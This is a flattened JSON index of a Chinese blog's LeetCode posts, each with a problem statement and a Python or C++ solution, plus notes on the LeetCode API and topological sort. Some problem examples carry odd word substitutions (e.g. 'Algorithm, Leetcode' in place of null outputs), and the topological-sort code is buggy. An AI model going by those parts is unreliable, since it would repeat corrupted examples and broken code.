1:\nInput: points = [[1,1],[2,2],[2,0],[2,4],[3,3],[4,2]]Output: [[1,1],[2,0],[3,3],[2,4],[4,2]]Example 2:\nInput: points = [[1,2],[2,2],[4,2]]Output: [[4,2],[2,2],[1,2]] Constraints:\nt1 \u003c= points.length \u003c= 3000tpoints[i].length == 2t0 \u003c= xi, yi \u003c= 100tAll the given points are unique. Sol 用向量外積看，前一個點與現在要加的點是不是方向是對的!! 不對就把前一個點pop\nclass Solution: def outerTrees(self, trees: List[List[int]]) -\u0026gt; List[List[int]]: def cross(o, a, b): return (a[0] - o[0]) * (b[1] - o[1]) - (a[1] - o[1]) * (b[0] - o[0]) ps = sorted(trees, key=lambda p: (p[0],p[1])) ps = [(x,y) for (x,y) in ps] up,down = [], [] for p in ps: while len(up) \u0026gt;= 2 and cross(up[-2],up[-1],p) \u0026lt; 0: up.pop() up.append(p) for p in reversed(ps): while len(down) \u0026gt;= 2 and cross(down[-2],down[-1],p) \u0026lt; 0: down.pop() down.append(p) return list(set(up+down)) ","permalink":"https://littlebees.github.io/2021/08/leetcode-587-erect-the-fence/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e人生第一次凸包\u003c/p\u003e","title":"leetcode-587 - Erect the Fence"},{"content":"動機 讓前面數字越小越好!!\nProblem Given string num representing a non-negative integer num, and an integer k, return the smallest possible integer after removing k digits from num.\nExample 1:\nInput: num = \"1432219\", k = 3Output: \"1219\"Explanation: Remove the three digits 4, 3, and 2 to form the new number 1219 which is the smallest.Example 2:\nInput: num = \"10200\", k = 1Output: \"200\"Explanation: Remove the leading 1 and the number is 200. Note that the output must not contain leading zeroes.Example 3:\nInput: num = \"10\", k = 2Output: \"0\"Explanation: Remove all the digits from the number and it is left with nothing which is 0. Constraints:\nt1 \u003c= k \u003c= num.length \u003c= 105tnum consists of only digits.tnum does not have any leading zeros except for the zero itself. Sol 在保持順序的狀態下，維持某一條件，Monotonic Stack\nclass Solution: def removeKdigits(self, num: str, k: int) -\u0026gt; str: stk = [] for c in num: while stk and k and stk[-1] \u0026gt; c: stk.pop() k -= 1 stk.append(c) for _ in range(k): if stk: stk.pop() i = 0 while i \u0026lt; len(stk) and stk[i] == \u0026#39;0\u0026#39;: i += 1 stk= stk[i:] return \u0026#34;0\u0026#34; if not stk else \u0026#39;\u0026#39;.join(stk) ","permalink":"https://littlebees.github.io/2021/08/leetcode-402-remove-k-digits/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e讓前面數字越小越好!!\u003c/p\u003e","title":"leetcode-402 - Remove K Digits"},{"content":"動機 1331變成2維\nProblem Given an m x n matrix, return a new matrix answer where answer[row][col] is the rank of matrix[row][col].\nThe rank is an integer that represents how large an element is compared to other elements. It is calculated using the following rules:\ntThe rank is an integer starting from 1.tIf two elements p and q are in the same row or column, then:tttIf p \u003c q then rank(p) \u003c rank(q)ttIf p == q then rank(p) == rank(q)ttIf p \u003e q then rank(p) \u003e rank(q)tttThe rank should be as small as possible.It is guaranteed that answer is unique under the given rules.\nExample 1:\nInput: matrix = [[1,2],[3,4]]Output: [[1,2],[2,3]]Explanation:The rank of matrix[0][0] is 1 because it is the smallest integer in its row and column.The rank of matrix[0][1] is 2 because matrix[0][1] \u003e matrix[0][0] and matrix[0][0] is rank 1.The rank of matrix[1][0] is 2 because matrix[1][0] \u003e matrix[0][0] and matrix[0][0] is rank 1.The rank of matrix[1][1] is 3 because matrix[1][1] \u003e matrix[0][1], matrix[1][1] \u003e matrix[1][0], and both matrix[0][1] and matrix[1][0] are rank 2.Example 2:\nInput: matrix = [[7,7],[7,7]]Output: [[1,1],[1,1]]Example 3:\nInput: matrix = [[20,-21,14],[-19,4,19],[22,-47,24],[-19,4,19]]Output: [[4,2,3],[1,3,4],[5,1,6],[1,3,4]]Example 4:\nInput: matrix = [[7,3,6],[1,4,5],[9,8,2]]Output: [[5,1,4],[1,2,3],[6,3,1]] Constraints:\ntm == matrix.lengthtn == matrix[i].lengtht1 \u003c= m, n \u003c= 500t-109 \u003c= matrix[row][col] \u003c= 109 Sol 數字的自己的行與列的rank都是一樣的\n所以需要一個方式記錄目前該行與該列最小的rank，之後取大的 同時，因為前面提到數字的自己的行與列的rank都是一樣的，所以同一行列的最小rank會因為這格被串在一起\n說到串，就是同一祖先，說到同一祖先就是union find\nclass Solution: def matrixRankTransform(self, mx: List[List[int]]) -\u0026gt; List[List[int]]: def find(uf,i): if uf[i] != i: uf[i] = find(uf,uf[i]) return uf[i] v2ps = defaultdict(list) for i in range(len(mx)): for j in range(len(mx[i])): v2ps[mx[i][j]].append((i,j)) rank = defaultdict(int) for v in sorted(v2ps.keys()): uf = list(range(len(mx)+len(mx[0]))) now = rank.copy() for (x,y) in v2ps[v]: x,y = find(uf,x),find(uf,y+len(mx)) uf[x] = y # x -\u0026gt; y, direct to y now[y] = max(now[x],now[y]) # update rank at y for (x,y) in v2ps[v]: rank[x] = rank[y+len(mx)] = mx[x][y] = now[find(uf,x)]+1 # search from x to y+len(mx), then get the cureent smallest rank return mx ","permalink":"https://littlebees.github.io/2021/08/leetcode-1632-rank-transform-of-a-matrix/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e1331變成2維\u003c/p\u003e","title":"leetcode-1632 - Rank Transform of a Matrix"},{"content":"動機 先做這題，再看1632會比較有感覺\nProblem Given an array of integers arr, replace each element with its rank.\nrrThe rank represents how large the element is. The rank has the following rules:\nrrrtRank is an integer starting from 1.rtThe larger the element, the larger the rank. If two elements are equal, their rank must be the same.rtRank should be as small as possible.rrr rExample 1:\nrrrInput: arr = [40,10,20,30]rOutput: [4,1,2,3]rExplanation: 40 is the largest element. 10 is the smallest. 20 is the second smallest. 30 is the third smallest.rrExample 2:\nrrrInput: arr = [100,100,100]rOutput: [1,1,1]rExplanation: Same elements share the same rank.rrrExample 3:\nrrrInput: arr = [37,12,28,9,100,56,80,5,12]rOutput: [5,3,4,2,8,6,7,1,3]rrr rConstraints:\nrrrt0 \u003c= arr.length \u003c= 105rt-109 \u003c= arr[i] \u003c= 109r Sol 存位置設定成一樣的rank\nclass Solution: def arrayRankTransform(self, arr: List[int]) -\u0026gt; List[int]: tbl = defaultdict(list) for (i,n) in enumerate(arr): tbl[n].append(i) rank = 1 for k in sorted(tbl.keys()): for i in tbl[k]: arr[i] = rank rank+=1 return arr ","permalink":"https://littlebees.github.io/2021/08/leetcode-1331-rank-transform-of-an-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e先做這題，再看1632會比較有感覺\u003c/p\u003e","title":"leetcode-1331 - Rank Transform of an Array"},{"content":"動機 又是看創意的一題，以後是不是要給這種題目個標籤\n用mask其中一個bit做分類依據\nProblem Given an integer array nums, in which exactly two elements appear only once and all the other elements appear exactly twice. Find the two elements that appear only once. You can return the answer in any order.\nYou must write an algorithm that runs in linear runtime complexity and uses only constant extra space.\nExample 1:\nInput: nums = [1,2,1,3,2,5]Output: [3,5]Explanation: [5, 3] is also a valid answer.Example 2:\nInput: nums = [-1,0]Output: [-1,0]Example 3:\nInput: nums = [0,1]Output: [1,0] Constraints:\nt2 \u003c= nums.length \u003c= 3 * 104t-231 \u003c= nums[i] \u003c= 231 - 1tEach integer in nums will appear twice, only two integers will appear once. Sol 用xor一次後，會拿到兩個數字的xor，之後我們取其中一個bit，做分類的mask\n重複兩次的數字一定往其中一邊走，而不同的數字因為mask，一定不會走向同一個地方\nclass Solution: def singleNumber(self, nums: List[int]) -\u0026gt; List[int]: mask = reduce(lambda acc,n: acc^n,nums,0) mask = mask \u0026amp; -mask #only keep LSB of mask ret = [0,0] for n in nums: if n \u0026amp; mask: ret[0] = ret[0] ^ n else: ret[1] = ret[1] ^ n return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-260-single-number-iii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e又是看創意的一題，以後是不是要給這種題目個標籤\u003c/p\u003e\n\u003cp\u003e\u003cem\u003e用mask其中一個bit做分類依據\u003c/em\u003e\u003c/p\u003e","title":"leetcode-260 - Single Number III"},{"content":"動機 Bit Manipulation，怕\nProblem Given an integer n, return true if it is a power of four. Otherwise, return false.\nAn integer n is a power of four, if there exists an integer x such that n == 4x.\nExample 1:\nInput: n = 16Output: trueExample 2:\nInput: n = 5Output: falseExample 3:\nInput: n = 1Output: true Constraints:\nt-231 \u003c= n \u003c= 231 - 1 Follow up: Could you solve it without loops/recursion? Sol 4的次方數扣1，必定被三整除(用binary格式去看就會看到偶數個1，所以一定會被3整除)\n接著要確認只有一個bit，像10扣1能被3整除，但10不是4的次方數\nclass Solution: def isPowerOfFour(self, n: int) -\u0026gt; bool: return n \u0026gt; 0 and (n-1) % 3 == 0 and (n\u0026amp;(n-1)) == 0 ","permalink":"https://littlebees.github.io/2021/08/leetcode-342-power-of-four/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eBit Manipulation，怕\u003c/p\u003e","title":"leetcode-342 - Power of Four"},{"content":"動機 要找時間看Reservoir Sampling\nProblem Given an integer array nums with possible duplicates, randomly output the index of a given target number. You can assume that the given target number must exist in the array.\nImplement the Solution class:\ntSolution(int[] nums) Initializes the object with the array nums.tint pick(int target) Picks a random index i from nums where nums[i] == target. If there are multiple valid i's, then each index should have an equal probability of returning. Example 1:\nInput[\"Solution\", \"pick\", \"pick\", \"pick\"][[[1, 2, 3, 3, 3]], [3], [1], [3]]Output[Algorithm, Leetcode, 4, 0, 2]ExplanationSolution solution = new Solution([1, 2, 3, 3, 3]);solution.pick(3); // It should return either index 2, 3, or 4 randomly. Each index should have equal probability of returning.solution.pick(1); // It should return 0. Since in the array only nums[0] is equal to 1.solution.pick(3); // It should return either index 2, 3, or 4 randomly. Each index should have equal probability of returning. Constraints:\nt1 \u003c= nums.length \u003c= 2 * 104t-231 \u003c= nums[i] \u003c= 231 - 1ttarget is an integer from nums.tAt most 104 calls will be made to pick. Sol class Solution: def __init__(self, nums: List[int]): self.ns = defaultdict(list) for (i,n) in enumerate(nums): self.ns[n].append(i) def pick(self, target: int) -\u0026gt; int: return self.ns[target][randint(0,len(self.ns[target])-1)] ","permalink":"https://littlebees.github.io/2021/08/leetcode-398-random-pick-index/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e要找時間看Reservoir Sampling\u003c/p\u003e","title":"leetcode-398 - Random Pick Index"},{"content":"動機 只有一個不一樣的就xor下去\nProblem You are given two strings s and t.\nString t is generated by random shuffling string s and then add one more letter at a random position.\nReturn the letter that was added to t.\nExample 1:\nInput: s = \"abcd\", t = \"abcde\"Output: \"e\"Explanation: 'e' is the letter that was added.Example 2:\nInput: s = \"\", t = \"y\"Output: \"y\"Example 3:\nInput: s = \"a\", t = \"aa\"Output: \"a\"Example 4:\nInput: s = \"ae\", t = \"aea\"Output: \"a\" Constraints:\nt0 \u003c= s.length \u003c= 1000tt.length == s.length + 1ts and t consist of lower-case English letters. Sol class Solution: def findTheDifference(self, s: str, t: str) -\u0026gt; str: a = reduce(lambda acc,x: acc^ord(x), s, 0) b = reduce(lambda acc,x: acc^ord(x), t, 0) return chr(a^b) ","permalink":"https://littlebees.github.io/2021/08/leetcode-389-find-the-difference/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e只有一個不一樣的就xor下去\u003c/p\u003e","title":"leetcode-389 - Find the Difference"},{"content":"動機 reverse是好東西\nProblem Given an m x n matrix mat, return an array of all the elements of the array in a diagonal order.\nExample 1:\nInput: mat = [[1,2,3],[4,5,6],[7,8,9]]Output: [1,2,4,7,5,3,6,8,9]Example 2:\nInput: mat = [[1,2],[3,4]]Output: [1,2,3,4] Constraints:\ntm == mat.lengthtn == mat[i].lengtht1 \u003c= m, n \u003c= 104t1 \u003c= m * n \u003c= 104t-105 \u003c= mat[i][j] \u003c= 105 Sol 從右上方的點出發，需要時再reverse\nclass Solution: def findDiagonalOrder(self, mat: List[List[int]]) -\u0026gt; List[int]: ret,rev = [], True for (i,j) in [(0,x) for x in range(len(mat[0]))][:-1]+[(x,len(mat[0])-1) for x in range(len(mat))]: tmp, x = [], 0 while i+x \u0026lt; len(mat) and j-x \u0026gt;= 0: tmp.append(mat[i+x][j-x]) x += 1 if rev: ret += tmp[::-1] else: ret += tmp rev = not rev return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-498-diagonal-traverse/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003ereverse是好東西\u003c/p\u003e","title":"leetcode-498 - Diagonal Traverse"},{"content":"動機 推導怎麼那麼難想，脫離高中太久，忘了還可以用相減去看\nProblem You are given an integer array nums of length n.\nAssume arrk to be an array obtained by rotating nums by k positions clock-wise. We define the rotation function F on nums as follow:\ntF(k) = 0 * arrk[0] + 1 * arrk[1] + ... + (n - 1) * arrk[n - 1].Return the maximum value of F(0), F(1), ..., F(n-1).\nThe test cases are generated so that the answer fits in a 32-bit integer.\nExample 1:\nInput: nums = [4,3,2,6]Output: 26Explanation:F(0) = (0 * 4) + (1 * 3) + (2 * 2) + (3 * 6) = 0 + 3 + 4 + 18 = 25F(1) = (0 * 6) + (1 * 4) + (2 * 3) + (3 * 2) = 0 + 4 + 6 + 6 = 16F(2) = (0 * 2) + (1 * 6) + (2 * 4) + (3 * 3) = 0 + 6 + 8 + 9 = 23F(3) = (0 * 3) + (1 * 2) + (2 * 6) + (3 * 4) = 0 + 2 + 12 + 12 = 26So the maximum value of F(0), F(1), F(2), F(3) is F(3) = 26.Example 2:\nInput: nums = [100]Output: 0 Constraints:\ntn == nums.lengtht1 \u003c= n \u003c= 105t-100 \u003c= nums[i] \u003c= 100 Sol f(0) = 0A + 1B + 2C + 3D f(1) = 3A + 0B + 1C + 2D f(2) = 2A + 3B + 0C + 1D f(1)-f(0) = 3A -1B - 1C - 1D f(2)-f(1) = -1A + 3B - 1C -1D sum = A + B + C + D f(1) = f(0) - sum + 4A f(2) = f(1) - sum + 4B f(n) = f(n-1) - sum + len(arr)*arr[n-1] class Solution: def maxRotateFunction(self, nums: List[int]) -\u0026gt; int: cnt = sum(nums) @cache def f(n): if n == 0: return sum([i*nums[i] for i in range(len(nums))]) else: return f(n-1) - cnt + len(nums)*nums[n-1] return max([f(i) for i in range(len(nums))]) ","permalink":"https://littlebees.github.io/2021/08/leetcode-396-rotate-function/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e推導怎麼那麼難想，脫離高中太久，忘了還可以用相減去看\u003c/p\u003e","title":"leetcode-396 - Rotate Function"},{"content":"動機 Problem Given a string s, partition s such that every substring of the partition is a palindrome.\nReturn the minimum cuts needed for a palindrome partitioning of s.\nExample 1:\nInput: s = \"aab\"Output: 1Explanation: The palindrome partitioning [\"aa\",\"b\"] could be produced using 1 cut.Example 2:\nInput: s = \"a\"Output: 0Example 3:\nInput: s = \"ab\"Output: 1 Constraints:\nt1 \u003c= s.length \u003c= 2000ts consists of lower-case English letters only. Sol dp(i)是以i結尾要多少cut\nclass Solution: def minCut(self, s: str) -\u0026gt; int: @cache def isP(i,j): if j-i \u0026lt;= 0: return True else: return s[i]==s[j] and isP(i+1,j-1) @cache def dp(j): if j == 0: return 0 elif j == -1: return -1 else: return min([dp(i-1)+1 for i in range(j+1) if isP(i,j)]) return dp(len(s)-1) ","permalink":"https://littlebees.github.io/2021/08/leetcode-132-palindrome-partitioning-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e","title":"leetcode-132 - Palindrome Partitioning II"},{"content":"動機 reverse iterator好讚\nProblem Given a m x n matrix grid which is sorted in non-increasing order both row-wise and column-wise, return the number of negative numbers in grid.\nExample 1:\nInput: grid = [[4,3,2,-1],[3,2,1,-1],[1,1,-1,-2],[-1,-1,-2,-3]]Output: 8Explanation: There are 8 negatives number in the matrix.Example 2:\nInput: grid = [[3,2],[1,0]]Output: 0Example 3:\nInput: grid = [[1,-1],[-1,-1]]Output: 3Example 4:\nInput: grid = [[-1]]Output: 1 Constraints:\ntm == grid.lengthtn == grid[i].lengtht1 \u003c= m, n \u003c= 100t-100 \u003c= grid[i][j] \u003c= 100 Follow up: Could you find an O(n + m) solution? Sol class Solution { public: int countNegatives(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; grid) { int ret = 0; for (auto\u0026amp; r:grid) ret += (lower_bound(r.rbegin(),r.rend(),0)-r.rbegin()); return ret; } }; ","permalink":"https://littlebees.github.io/2021/08/leetcode-1351-count-negative-numbers-in-a-sorted-matrix/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003ereverse iterator好讚\u003c/p\u003e","title":"leetcode-1351 - Count Negative Numbers in a Sorted Matrix"},{"content":"動機 注意正負數的2倍，分別會變大變小\nProblem Given an array arr of integers, check if there exists two integers N and M such that N is the double of M ( i.e. N = 2 * M).\nMore formally check if there exists two indices i and j such that :\nti != jt0 \u003c= i, j \u003c arr.lengthtarr[i] == 2 * arr[j] Example 1:\nInput: arr = [10,2,5,3]Output: trueExplanation: N = 10 is the double of M = 5,that is, 10 = 2 * 5.Example 2:\nInput: arr = [7,1,14,11]Output: trueExplanation: N = 14 is the double of M = 7,that is, 14 = 2 * 7.Example 3:\nInput: arr = [3,1,7,11]Output: falseExplanation: In this case does not exist N and M, such that N = 2 * M. Constraints:\nt2 \u003c= arr.length \u003c= 500t-10^3 \u003c= arr[i] \u003c= 10^3 Sol class Solution { public: bool checkIfExist(vector\u0026lt;int\u0026gt;\u0026amp; arr) { sort(arr.begin(),arr.end()); for(auto i=arr.begin();i!=arr.end();i++) { int target = (*i \u0026lt; 0) \u0026amp;\u0026amp; ((*i) % 2 == 0) ? (*i)/2 : (*i)*2; auto j = lower_bound(i+1,arr.end(),target); if (j != arr.end() \u0026amp;\u0026amp; *j == target) { cout \u0026lt;\u0026lt; *i \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; *j \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; return 1; } } return 0; } }; ","permalink":"https://littlebees.github.io/2021/08/leetcode-1346-check-if-n-and-its-double-exist/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e注意正負數的2倍，分別會變大變小\u003c/p\u003e","title":"leetcode-1346 - Check If N and Its Double Exist"},{"content":"動機 要複習一下怎麼用C++\nProblem Given a string s containing only digits, return all possible valid IP addresses that can be obtained from s. You can return them in any order.\nA valid IP address consists of exactly four integers, each integer is between 0 and 255, separated by single dots and cannot have leading zeros. For example, \"0.1.2.201\" and \"192.168.1.1\" are valid IP addresses and \"0.011.255.245\", \"192.168.1.312\" and \"192.168@1.1\" are invalid IP addresses. Example 1:\nInput: s = \"25525511135\"Output: [\"255.255.11.135\",\"255.255.111.35\"]Example 2:\nInput: s = \"0000\"Output: [\"0.0.0.0\"]Example 3:\nInput: s = \"1111\"Output: [\"1.1.1.1\"]Example 4:\nInput: s = \"010010\"Output: [\"0.10.0.10\",\"0.100.1.0\"]Example 5:\nInput: s = \"101023\"Output: [\"1.0.10.23\",\"1.0.102.3\",\"10.1.0.23\",\"10.10.2.3\",\"101.0.2.3\"] Constraints:\nt0 \u003c= s.length \u003c= 3000ts consists of digits only. Sol 題外話: 原來multiset就是sortedlist\nclass Solution { public: void bt(string\u0026amp;\u0026amp; s, int seg, string acc, vector\u0026lt;string\u0026gt;\u0026amp; ret) { if (seg == 5) { if (s.empty()) ret.push_back(acc.substr(0,acc.size()-1)); // remove dot } else { for (auto\u0026amp; len : {1, 2, 3}) { if (s.size() \u0026gt;= len) { string net = s.substr(0,len); if (stoi(net) \u0026lt;= 255 \u0026amp;\u0026amp; (net[0] != \u0026#39;0\u0026#39; || net == \u0026#34;0\u0026#34;)) bt(s.substr(len),seg+1,acc+net+\u0026#34;.\u0026#34;,ret); } } } } vector\u0026lt;string\u0026gt; restoreIpAddresses(string s, int seg=1) { vector\u0026lt;string\u0026gt; ret; bt(move(s),1,\u0026#34;\u0026#34;,ret); return ret; } }; ","permalink":"https://littlebees.github.io/2021/08/leetcode-93-restore-ip-addresses/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e要複習一下怎麼用C++\u003c/p\u003e","title":"leetcode-93 - Restore IP Addresses"},{"content":"動機 以前只有留解法，之後要看的時候很難一次回想起，這些到底要幹嘛 所以就研究怎麼打api，抓資料再跑腳本\nAPI JSON https://leetcode.com/api/problems/algorithms/ 回傳所有問題的id與slug slug就是查詢問題的key Graphql https://leetcode.com/graphql 拿詳細資料，有很多東西，可以用dev tools的network去看 這裡我們要問題的資訊，所以大概像 {\u0026quot;operationName\u0026quot;:\u0026quot;questionData\u0026quot;,\u0026quot;variables\u0026quot;:{\u0026quot;titleSlug\u0026quot;: \u0026quot;two-sum\u0026quot;},\u0026quot;query\u0026quot;:\u0026quot;query questionData($titleSlug: String!) { question(titleSlug: $titleSlug) { content topicTags { name } }}\u0026quot;} bash 這次bash最坑的地方有兩個\n用斷行做array分界 像是title會有空白，\u0026quot;two sum\u0026quot;，到bash array會變成，[\u0026quot;two, sum\u0026quot;] 所以要這樣 IFS=$'\\n' topics=($(jq '.topics[]' leetcodes/$id.json)) 但這樣就沒辦法用local，不知道是不能用在local，還是IFS應該放在local後面(但這樣也很怪不是) sed的append後馬上插入斷行 不能用sed -i \u0026quot;/\u0026lt;!--more--\u0026gt;/a \\nhello world，會變成nhello world 這其實是處理插入多空白的方式sed -i \u0026quot;/\u0026lt;!--more--\u0026gt;/a \\ hello world，會變成 hello world 要用下面的方式，但是不能縮排，縮排會被算進去 另外還有$'\\nhello world'，在$後面的字串就是c-style，但是因為是single quote，所以不能用var替換QQ # \\\\後面就是什麼都可以用了 sed -i \u0026#34;/\u0026lt;!--more--\u0026gt;/a\\\\ \\n## Problem\\n${content}\\n\u0026#34; $1 另外記一下sed插入string到某一行，之後、之前、尾巴的方式\n# Using sed and the pattern described: sed \u0026#39;/192.168.1.2/s/$/ myalias/\u0026#39; file sed \u0026#39;2s/$/ myalias/\u0026#39; file #Append line after match sed \u0026#39;/\\[option\\]/a Hello World\u0026#39; input #Insert line before match sed \u0026#39;/\\[option\\]/i Hello World\u0026#39; input ","permalink":"https://littlebees.github.io/2021/08/%E6%89%93leetcode-api%E5%BF%83%E5%BE%97/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e以前只有留解法，之後要看的時候很難一次回想起，這些到底要幹嘛\n所以就研究怎麼打api，抓資料再跑腳本\u003c/p\u003e","title":"打leetcode API心得"},{"content":"動機 複習BFS\nProblem Given an n-ary tree, return the level order traversal of its nodes' values.\nNary-Tree input serialization is represented in their level order traversal, each group of children is separated by the Leetcode value (See examples).\nExample 1:\nInput: root = [1,null,3,2,4,null,5,6]Output: [[1],[3,2,4],[5,6]]Example 2:\nInput: root = [1,null,2,3,4,5,null,null,6,7,null,8,null,9,10,null,null,11,null,12,null,13,null,null,14]Output: [[1],[2,3,4,5],[6,7,8,9,10],[11,12,13],[14]] Constraints:\ntThe height of the n-ary tree is less than or equal to 1000tThe total number of nodes is between [0, 104] Sol class Solution: def levelOrder(self, root: \u0026#39;Node\u0026#39;) -\u0026gt; List[List[int]]: if not root: return [] q = deque([[root]]) ret = [] while q: rs = q.popleft() ret.append([r.val for r in rs]) rs = sum([[x for x in r.children if x] for r in rs if r],[]) if rs: q.append(rs) return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-429-n-ary-tree-level-order-traversal/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習BFS\u003c/p\u003e","title":"leetcode-429 - N-ary Tree Level Order Traversal"},{"content":"動機 topo sort的重點是怎麼從對的點開始加，像是dfs就要特別注意，不像bfs會有in_degree確認，dfs就是走，什麼都不管\nDFS 從*終點(沒有到其他node的edge)*開始往後走，最後的結果要reverse，因為是從終點開始放\n另外會有個table去放，node是處理完畢還是處理中的狀態\ndef topologicalSortUtil(self, v, visited, stack): if visited[v] == 1: raise \u0026#39;loop\u0026#39; elif visited[v] == 2: return visited[v] = 1 for i in self.graph[v]: if visited[i] == False: self.topologicalSortUtil(i, visited, stack) stack.append(v) visited[v] = 2 def topologicalSort(self): visited = [0]*self.V stack = [] for i in range(self.V): if visited[i] == 0: self.topologicalSortUtil(i, visited, stack) print(stack[::-1]) # return list in reverse order BFS (Kahn’s algorithm) 從*起點(沒有其他node指到他)*開始往前走，因為要看被多少node指到，所以一個table要另外算 之後就是一直找沒有被指到的邊緣node，加到結果\n這裡處理loop就是看bfs結束時是不是所有node都有加到結果，因為loop一定會指到，所以不會被bfs當成邊緣node\ndef topologicalSort(self): in_degree = [0]*(self.V) for i in self.graph: for j in self.graph[i]: in_degree[j] += 1 queue = [queue.append(i) for i in range(self.V) if in_degree[i] == 0] cnt = 0 top_order = [] while queue: u = queue.pop(0) top_order.append(u) for i in self.graph[u]: in_degree[i] -= 1 if in_degree[i] == 0: queue.append(i) cnt += 1 if cnt != self.V: print \u0026#34;There exists a cycle in the graph\u0026#34; else : print top_order ","permalink":"https://littlebees.github.io/2021/08/topological-sort/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003etopo sort的重點是怎麼從對的點開始加，像是dfs就要特別注意，不像bfs會有in_degree確認，dfs就是走，什麼都不管\u003c/p\u003e","title":"Topological sort"},{"content":"動機 比array好多了\nProblem Given the head of a linked list, rotate the list to the right by k places.\nExample 1:\nInput: head = [1,2,3,4,5], k = 2Output: [4,5,1,2,3]Example 2:\nInput: head = [0,1,2], k = 4Output: [2,0,1] Constraints:\nThe number of nodes in the list is in the range [0, 500].-100 \u003c= Node.val \u003c= 1000 \u003c= k \u003c= 2 * 109 Sol 直接slice後面接到前面\nclass Solution: def rotateRight(self, head: ListNode, k: int) -\u0026gt; ListNode: now = head size = 0 while now: size, now = size+1, now.next if size == 0: return head k = k%size prev = head for _ in range(size-k-1): prev = prev.next back_end = prev prev = prev.next back_end.next = None if prev: prev_end = prev while prev_end.next: prev_end = prev_end.next prev_end.next = head return prev else: return head ","permalink":"https://littlebees.github.io/2021/08/leetcode-61-rotate-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e比array好多了\u003c/p\u003e","title":"leetcode-61 - Rotate List"},{"content":"動機 就bfs\nProblem Given the root of a binary tree, return the bottom-up level order traversal of its nodes' values. (i.e., from left to right, level by level from leaf to root).\nExample 1:\nInput: root = [3,9,20,null,null,15,7]Output: [[15,7],[9,20],[3]]Example 2:\nInput: root = [1]Output: [[1]]Example 3:\nInput: root = []Output: [] Constraints:\nThe number of nodes in the tree is in the range [0, 2000].-1000 \u003c= Node.val \u003c= 1000 Sol class Solution: def levelOrderBottom(self, root: TreeNode) -\u0026gt; List[List[int]]: if not root: return [] q = deque([[root]]) ret = [] while q: now = [] rs = q.popleft() ret.append([r.val for r in rs]) for r in rs: for n in [r.left,r.right]: if n: now.append(n) if len(now) \u0026gt; 0: q.append(now) ret.reverse() return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-107-binary-tree-level-order-traversal-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就bfs\u003c/p\u003e","title":"leetcode-107 - Binary Tree Level Order Traversal II"},{"content":"動機 有趣的一題\nProblem Design a stack-like data structure to push elements to the stack and pop the most frequent element from the stack.\nImplement the FreqStack class:\nFreqStack() constructs an empty frequency stack.void push(int val) pushes an integer val onto the top of the stack.int pop() removes and returns the most frequent element in the stack.If there is a tie for the most frequent element, the element closest to the stack's top is removed and returned. Example 1:\nInput[FreqStack, push, push, push, push, push, push, pop, pop, pop, pop][[], [5], [7], [5], [7], [4], [5], [], [], [], []]Output[null, null, null, null, null, null, null, 5, 7, 5, 4]ExplanationFreqStack freqStack = new FreqStack();freqStack.push(5); // The stack is [5]freqStack.push(7); // The stack is [5,7]freqStack.push(5); // The stack is [5,7,5]freqStack.push(7); // The stack is [5,7,5,7]freqStack.push(4); // The stack is [5,7,5,7,4]freqStack.push(5); // The stack is [5,7,5,7,4,5]freqStack.pop(); // return 5, as 5 is the most frequent. The stack becomes [5,7,5,7,4].freqStack.pop(); // return 7, as 5 and 7 is the most frequent, but 7 is closest to the top. The stack becomes [5,7,5,4].freqStack.pop(); // return 5, as 5 is the most frequent. The stack becomes [5,7,4].freqStack.pop(); // return 4, as 4, 5 and 7 is the most frequent, but 4 is closest to the top. The stack becomes [5,7]. Constraints:\n0 \u003c= val \u003c= 109At most 2 * 104 calls will be made to push and pop.It is guaranteed that there will be at least one element in the stack before calling pop. Sol class FreqStack: def __init__(self): self.stks = defaultdict(list) self.v2l = defaultdict(int) self.max_len = 0 def push(self, val: int) -\u0026gt; None: self.v2l[val] += 1 self.stks[self.v2l[val]].append(val) self.max_len = max(self.max_len, self.v2l[val]) def pop(self) -\u0026gt; int: val = self.stks[self.max_len].pop() if not self.stks[self.max_len]: self.max_len -= 1 self.v2l[val] -= 1 return val ","permalink":"https://littlebees.github.io/2021/08/leetcode-895-maximum-frequency-stack/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e有趣的一題\u003c/p\u003e","title":"leetcode-895 - Maximum Frequency Stack"},{"content":"動機 就heap\nProblem You have k lists of sorted integers in non-decreasing order. Find the smallest range that includes at least one number from each of the k lists.\nWe define the range [a, b] is smaller than range [c, d] if b - a \u003c d - 